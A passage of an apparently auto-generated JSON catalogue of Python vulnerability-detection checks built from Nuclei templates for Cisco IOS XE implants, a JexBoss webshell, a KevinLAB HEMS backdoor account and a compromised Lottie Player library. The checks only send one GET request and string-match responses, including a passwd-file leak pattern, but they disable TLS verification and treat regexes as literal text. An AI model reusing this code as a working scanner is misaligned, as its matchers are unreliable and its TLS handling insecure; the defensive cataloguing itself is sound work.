     try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['webui-centerpanel-title'] | regex ['^([a-f0-9]{18})\\\\\\\\s*$'] | DSL: status_code_2 == 200\"\n\n        # Simple word matcher simulation\n        matchers = ['webui-centerpanel-title', '^([a-f0-9]{18})\\\\\\\\s*$']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Cisco IOS XE - Impant Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_cisco_implant_detect(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "backdoor",
          "cisco",
          "ios",
          "kev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_jexboss_backdoor",
        "name": "JexBoss - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "JexBoss is susceptible to remote code execution via the webshell. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.",
        "severity": "critical",
        "detection": "[AND] regex ['root:.*:0:0:', '\\\\[(font|extension|file)s\\\\]'] | mot(s) 'X-Powered-By: Servlet'",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jexboss-backdoor\nName: JexBoss - Remote Code Execution\nSeverity: critical\nDescription: JexBoss is susceptible to remote code execution via the webshell. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jexboss_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jexboss-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"JexBoss - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:', '\\\\\\\\[(font|extension|file)s\\\\\\\\]'] | mot(s) 'X-Powered-By: Servlet'\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:', '\\\\\\\\[(font|extension|file)s\\\\\\\\]', 'X-Powered-By: Servlet']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"JexBoss - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jexboss_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jexboss-backdoor\nName: JexBoss - Remote Code Execution\nSeverity: critical\nDescription: JexBoss is susceptible to remote code execution via the webshell. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jexboss_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jexboss-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"JexBoss - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:', '\\\\\\\\[(font|extension|file)s\\\\\\\\]'] | mot(s) 'X-Powered-By: Servlet'\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:', '\\\\\\\\[(font|extension|file)s\\\\\\\\]', 'X-Powered-By: Servlet']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"JexBoss - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jexboss_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "backdoor",
          "jboss",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_kevinlab_hems_backdoor",
        "name": "KevinLAB HEMS - Backdoor Detection",
        "language": "Python",
        "famille": "Auth",
        "description": "KevinLAB HEMS has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the HEMS is offering remotely.",
        "severity": "critical",
        "detection": "[AND] mot(s) '<meta http-equiv=\"refresh\" content=\"0; url=/\"></meta>' | mot(s) '<script> alert' | mot(s) 'PHPSESSID' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: kevinlab-hems-backdoor\nName: KevinLAB HEMS - Backdoor Detection\nSeverity: critical\nDescription: KevinLAB HEMS has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the HEMS is offering remotely.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_kevinlab_hems_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"kevinlab-hems-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"KevinLAB HEMS - Backdoor Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'<meta http-equiv=\"refresh\" content=\"0; url=/\"></meta>\\' | mot(s) \\'<script> alert\\' | mot(s) \\'PHPSESSID\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['<meta http-equiv=\"refresh\" content=\"0; url=/\"></meta>', '<script> alert', 'PHPSESSID']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"KevinLAB HEMS - Backdoor Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_kevinlab_hems_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: kevinlab-hems-backdoor\nName: KevinLAB HEMS - Backdoor Detection\nSeverity: critical\nDescription: KevinLAB HEMS has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the HEMS is offering remotely.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_kevinlab_hems_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"kevinlab-hems-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"KevinLAB HEMS - Backdoor Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'<meta http-equiv=\"refresh\" content=\"0; url=/\"></meta>\\' | mot(s) \\'<script> alert\\' | mot(s) \\'PHPSESSID\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['<meta http-equiv=\"refresh\" content=\"0; url=/\"></meta>', '<script> alert', 'PHPSESSID']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"KevinLAB HEMS - Backdoor Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_kevinlab_hems_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "kevinlab",
          "default-login",
          "backdoor",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_lottie_backdoor",
        "name": "Lottie Player - Backdoor",
        "language": "Python",
        "famille": "WebApp",
        "description": "Detectes vulnerable compormised version of lottie-player JS Library that were compormised with a Web3 wallet pop-up backdoor.",
        "severity": "critical",
        "detection": "[OR] mot(s) 'lottie-player@2.0.5, lottie-player@2.0.6, lottie-player@2.0.7'",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
